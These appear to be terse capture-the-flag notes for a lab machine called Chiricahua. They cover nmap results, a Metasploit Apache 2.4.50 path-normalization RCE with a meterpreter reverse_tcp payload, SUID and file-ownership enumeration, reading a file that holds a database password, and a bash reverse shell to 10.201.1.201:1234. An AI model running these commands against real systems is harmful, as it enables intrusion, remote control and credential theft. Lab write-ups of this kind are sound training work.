# recon 
## _nmap_
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 524aa8716d9280f404454297cefa23ed (RSA)
|   256 7b9a0cc3b59470313032633af5cba7f8 (ECDSA)
|_  256 d6e04937f74d8499daf1ca88dbb0261d (ED25519)
80/tcp open  http    Apache httpd 2.4.50 ((Unix))
|_http-server-header: Apache/2.4.50 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Chiricahua
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# exploit
msf6 > search apache 2.4.50
msf6 > use 0
[-] Using configured payload linux/x64/meterpreter/reverse_tcp
[msf6 exploit(multi/http/apache_normalize_path_rce)] > set ssl false
[msf6 exploit(multi/http/apache_normalize_path_rce)] > set rport 80

# foothold
## _enum_
$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
```
-rwsr-xr-x 1 root root 46384 Oct  5  2021 /usr/local/apache2/bin/suexec
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
```
$
```
find / -user geronimo  2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```
	/etc/init.d/goyahkla
	/etc/mysql/war.sql

$ 
```
cat /etc/mysql/war.sql
```
	CREATE USER 'guujiya'@'localhost' IDENTIFIED BY '6yFwwB4yNfWQAAbQ';
	GRANT ALL PRIVILEGES ON war.* TO 'guujiya'@'localhost';

$
```
cat /etc/init.d/goyahkla
```
	#!/bin/sh
	while [ true ];
	do
	    new_files=$(find /home/geronimo -mmin -5 -type f)
	    for file in $new_files;
	    do
	        rm $file
	    done
	    sleep 1
	done

```
grep -r "/etc/init.d/goyahkla" / 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```

```
bash -i >& /dev/tcp/10.201.1.201/1234 0>&1
```